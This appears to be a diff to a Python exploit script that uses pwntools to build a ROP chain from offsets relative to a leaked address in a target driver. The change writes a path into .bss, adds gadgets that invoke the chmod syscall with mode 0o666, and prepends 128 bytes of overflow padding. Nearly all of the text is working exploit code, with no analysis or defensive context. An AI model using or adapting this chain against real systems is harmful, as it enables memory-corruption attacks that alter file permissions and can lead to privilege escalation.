@@ -77,10 +77,13 @@ def build(leak, gadget_file, sled_length):
     # Create the ROP stack
     rop = ROP(binary)
 
+    # Push a valid rbp
+    rop.raw(0x7fffffffff00)
+
     # Put a nice lil ret seld on der
-    for i in range(0, sled_length):
-        # ret;
-        rop.raw(adjuster(leak + 0x01ea33))
+    # for i in range(0, sled_length):
+    #     # ret;
+    #     rop.raw(adjuster(leak + 0x01ea33))
 
     # Build a string in the .bss section of the target driver
     # the .bss section starts at the address the driver was loaded
@@ -90,7 +93,8 @@ def build(leak, gadget_file, sled_length):
     # pop rax; ret;
     rop.raw(adjuster(leak + 0x01f7bd))
     # /etc
-    rop.raw(b'/etc')
+    # rop.raw(b'/etc')
+    rop.raw(b'/tmp')
     # pop rdi; ret;
     rop.raw(adjuster(leak + 0x07b62a))
     # set rdi
@@ -120,10 +124,28 @@ def build(leak, gadget_file, sled_length):
     # mov rax, (rdi)
     rop.raw(adjuster(leak + 0x081643))
 
+    # Now call chmod
+
+    # pop rax; ret;
+    rop.raw(adjuster(leak + 0x01f7bd))
+    # set rax
+    rop.raw(0x5a)
+    # pop rdi; ret;
+    rop.raw(adjuster(leak + 0x07b62a))
+    # set rdi
+    rop.raw(adjuster(string_location))
+    # pop rsi; ret;
+    rop.raw(adjuster(leak + 0x035058))
+    # set rsi
+    rop.raw(0o666)
+    # syscall; NULL
+    rop.raw(adjuster(leak + 0x012c384))
+
     # Display our completed ROP chain
     print(rop.dump())
     # Return it as bytes to be writen out
-    return bytes(rop)
+    # Put 132 bytes of whatever
+    return b'A'*128 + bytes(rop)
 
 def create_exploit(target_binary, payload_file, sled_length, leak):
     exploit = build(leak, target_binary, sled_length)
